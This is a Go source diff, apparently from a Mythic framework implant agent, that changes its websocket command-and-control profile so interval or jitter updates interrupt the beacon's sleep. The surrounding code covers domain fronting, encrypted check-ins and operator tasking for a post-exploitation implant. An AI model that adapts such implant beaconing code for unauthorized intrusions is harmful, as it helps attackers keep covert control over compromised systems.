@@ -49,25 +49,26 @@ const TaskingTypePush = "Push"
 const TaskingTypePoll = "Poll"
 
 type C2Websockets struct {
-	HostHeader      string `json:"HostHeader"`
-	BaseURL         string `json:"BaseURL"`
-	Interval        int    `json:"Interval"`
-	Jitter          int    `json:"Jitter"`
-	ExchangingKeys  bool   `json:"-"`
-	UserAgent       string `json:"UserAgent"`
-	Key             string `json:"EncryptionKey"`
-	RsaPrivateKey   *rsa.PrivateKey
-	PollConn        *websocket.Conn `json:"-"`
-	PushConn        *websocket.Conn `json:"-"`
-	Lock            sync.RWMutex    `json:"-"`
-	ReconnectLock   sync.RWMutex    `json:"-"`
-	Endpoint        string          `json:"Websocket URL Endpoint"`
-	TaskingType     string          `json:"TaskingType"`
-	Killdate        time.Time       `json:"KillDate"`
-	FinishedStaging bool
-	ShouldStop      bool
-	stoppedChannel  chan bool
-	PushChannel     chan structs.MythicMessage `json:"-"`
+	HostHeader            string `json:"HostHeader"`
+	BaseURL               string `json:"BaseURL"`
+	Interval              int    `json:"Interval"`
+	Jitter                int    `json:"Jitter"`
+	ExchangingKeys        bool   `json:"-"`
+	UserAgent             string `json:"UserAgent"`
+	Key                   string `json:"EncryptionKey"`
+	RsaPrivateKey         *rsa.PrivateKey
+	PollConn              *websocket.Conn `json:"-"`
+	PushConn              *websocket.Conn `json:"-"`
+	Lock                  sync.RWMutex    `json:"-"`
+	ReconnectLock         sync.RWMutex    `json:"-"`
+	Endpoint              string          `json:"Websocket URL Endpoint"`
+	TaskingType           string          `json:"TaskingType"`
+	Killdate              time.Time       `json:"KillDate"`
+	FinishedStaging       bool
+	ShouldStop            bool
+	stoppedChannel        chan bool
+	PushChannel           chan structs.MythicMessage `json:"-"`
+	interruptSleepChannel chan bool
 }
 
 var websocketDialer = websocket.Dialer{
@@ -112,16 +113,17 @@ func init() {
 		finalUrl = finalUrl + "/"
 	}
 	profile := C2Websockets{
-		HostHeader:     initialConfig.DomainFront,
-		BaseURL:        finalUrl,
-		UserAgent:      initialConfig.UserAgent,
-		Key:            initialConfig.AESPSK,
-		Endpoint:       initialConfig.Endpoint,
-		ShouldStop:     true,
-		stoppedChannel: make(chan bool, 1),
-		PushChannel:    make(chan structs.MythicMessage, 100),
-		PollConn:       nil,
-		PushConn:       nil,
+		HostHeader:            initialConfig.DomainFront,
+		BaseURL:               finalUrl,
+		UserAgent:             initialConfig.UserAgent,
+		Key:                   initialConfig.AESPSK,
+		Endpoint:              initialConfig.Endpoint,
+		ShouldStop:            true,
+		stoppedChannel:        make(chan bool, 1),
+		PushChannel:           make(chan structs.MythicMessage, 100),
+		PollConn:              nil,
+		PushConn:              nil,
+		interruptSleepChannel: make(chan bool, 1),
 	}
 
 	// Convert sleep from string to integer
@@ -155,6 +157,13 @@ func init() {
 	profile.Killdate = killDateTime
 	RegisterAvailableC2Profile(&profile)
 	go profile.CreateMessagesForEgressConnections()
+}
+func (c *C2Websockets) Sleep() {
+	// wait for either sleep time duration or sleep interrupt
+	select {
+	case <-c.interruptSleepChannel:
+	case <-time.After(time.Second * time.Duration(c.GetSleepTime())):
+	}
 }
 func (c *C2Websockets) CheckForKillDate() {
 	for true {
@@ -199,7 +208,7 @@ func (c *C2Websockets) Start() {
 				SetAllEncryptionKeys(c.Key)
 				break
 			} else {
-				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+				c.Sleep()
 				continue
 			}
 		}
@@ -220,13 +229,13 @@ func (c *C2Websockets) Start() {
 				err := json.Unmarshal(resp, &taskResp)
 				if err != nil {
 					utils.PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
-					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+					c.Sleep()
 					continue
 				}
 				// async handle the response back
 				responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
 			}
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 		}
 	} else {
 		go c.CheckForKillDate()
@@ -270,11 +279,17 @@ func (c *C2Websockets) UpdateConfig(parameter string, value string) {
 		if err == nil {
 			c.Interval = newInt
 		}
+		go func() {
+			c.interruptSleepChannel <- true
+		}()
 	case "Jitter":
 		newInt, err := strconv.Atoi(value)
 		if err == nil {
 			c.Jitter = newInt
 		}
+		go func() {
+			c.interruptSleepChannel <- true
+		}()
 	case "UserAgent":
 		c.UserAgent = value
 		changingConnectionParameter = true
@@ -372,6 +387,9 @@ func (c *C2Websockets) SetSleepInterval(interval int) string {
 	}
 	if interval >= 0 {
 		c.Interval = interval
+		go func() {
+			c.interruptSleepChannel <- true
+		}()
 		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
 	} else {
 		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
@@ -384,6 +402,9 @@ func (c *C2Websockets) SetSleepJitter(jitter int) string {
 	}
 	if jitter >= 0 && jitter <= 100 {
 		c.Jitter = jitter
+		go func() {
+			c.interruptSleepChannel <- true
+		}()
 		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
 	} else {
 		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
@@ -588,7 +609,7 @@ func (c *C2Websockets) reconnect() {
 				if c.ShouldStop {
 					return
 				}
-				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+				c.Sleep()
 			}
 			IncrementFailedConnection(c.ProfileName())
 			continue
@@ -672,7 +693,7 @@ func (c *C2Websockets) sendData(sendData []byte) []byte {
 				return []byte{}
 			}
 			utils.PrintDebug(fmt.Sprintf("Error decoding base64 data: ", err.Error()))
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 			continue
 		}
 
@@ -682,7 +703,7 @@ func (c *C2Websockets) sendData(sendData []byte) []byte {
 				return []byte{}
 			}
 			utils.PrintDebug(fmt.Sprintf("length of data < 36"))
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 			continue
 		}
 
@@ -697,7 +718,7 @@ func (c *C2Websockets) sendData(sendData []byte) []byte {
 					utils.PrintDebug(fmt.Sprintf("got c.ShouldStop || c.TaskingType change in Polling sendData\n"))
 					return []byte{}
 				}
-				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+				c.Sleep()
 				continue
 			}
 		}
